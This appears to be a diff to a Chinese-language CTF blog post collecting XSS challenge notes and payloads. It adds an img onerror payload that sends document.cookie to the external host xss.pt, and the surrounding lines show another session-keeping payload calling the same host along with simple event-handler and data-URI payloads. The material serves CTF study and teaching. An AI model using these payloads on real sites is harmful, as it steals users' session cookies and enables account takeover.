@@ -1,7 +1,7 @@
 ---
 author: "Yiming Shen"
 date: 2022-02-26
-lastmod: 2022-03-05
+lastmod: 2022-03-07
 title: "XSS类型题目积累及资料"
 tags: [
     "CTF",
@@ -81,6 +81,9 @@ if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=Sh
 <h1 onmousemove="alert('moved!')">Title1</h1>
     
 <iframe src = "data:text/html;base64,_base64codehere="></iframe> <!-Data伪协议->
+    
+    
+<img src="s" onerror=document.location='https://xss.pt/Sh8sp.jpg?cookie='+document.cookie;></img>
 ```
 
 ## XSS过滤和绕过
